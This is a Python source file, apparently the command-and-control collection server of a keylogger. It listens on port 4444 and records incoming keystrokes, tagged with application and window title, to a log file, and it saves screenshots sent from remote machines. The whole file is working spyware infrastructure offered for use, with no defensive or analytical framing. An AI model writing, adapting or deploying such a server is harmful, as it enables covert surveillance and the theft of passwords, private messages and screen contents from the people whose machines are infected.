import socket
import json
import base64
import os

# --- Configuration ---
HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 4444
LOG_DIR = 'remote_logs'
SCREENSHOT_DIR = os.path.join(LOG_DIR, 'screenshots')

# --- Setup ---
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

def handle_client(conn, addr):
    print(f"[+] New connection from {addr[0]}:{addr[1]}")
    try:
        buffer = ""
        while True:
            data = conn.recv(1024).decode('utf-8')
            if not data:
                break
            buffer += data
            while '\n' in buffer:
                message, buffer = buffer.split('\n', 1)
                try:
                    message_json = json.loads(message)
                    log_data(message_json)
                except json.JSONDecodeError as e:
                    print(f"[!] Error decoding JSON: {e}")
                except Exception as e:
                    print(f"[!] Error processing message: {e}")

    except ConnectionResetError:
        print(f"[-] Connection from {addr[0]}:{addr[1]} lost.")
    except Exception as e:
        print(f"[!] An error occurred with client {addr[0]}:{addr[1]}: {e}")
    finally:
        conn.close()
        print(f"[-] Connection from {addr[0]}:{addr[1]} closed.")

def log_data(data):
    log_type = data.get('type')
    timestamp = data.get('timestamp', 'No Timestamp')
    
    if log_type == 'keystroke':
        application = data.get('application', 'UNKNOWN')
        log_entry = f"[{timestamp}] Keystroke: {data.get('key')} (Application: {application}, Window: {data.get('window_title')})"
        print(log_entry)
        with open(os.path.join(LOG_DIR, 'keystrokes.log'), 'a') as f:
            f.write(log_entry + '\n')
            
    elif log_type == 'screenshot':
        try:
            image_data = base64.b64decode(data['image'])
            filename = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
            with open(filename, 'wb') as f:
                f.write(image_data)
            print(f"[+] Screenshot saved: {filename}")
        except Exception as e:
            print(f"[!] Failed to save screenshot: {e}")
            
    else:
        log_entry = f"[{timestamp}] Unknown data type '{log_type}': {data}"
        print(log_entry)
        with open(os.path.join(LOG_DIR, 'other.log'), 'a') as f:
            f.write(log_entry + '\n')

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] Listening on {HOST}:{PORT}")
        while True:
            conn, addr = s.accept()
            # In a real application, you'd likely want to handle each client
            # in a separate thread to manage multiple connections.
            handle_client(conn, addr)

if __name__ == "__main__":
    start_server()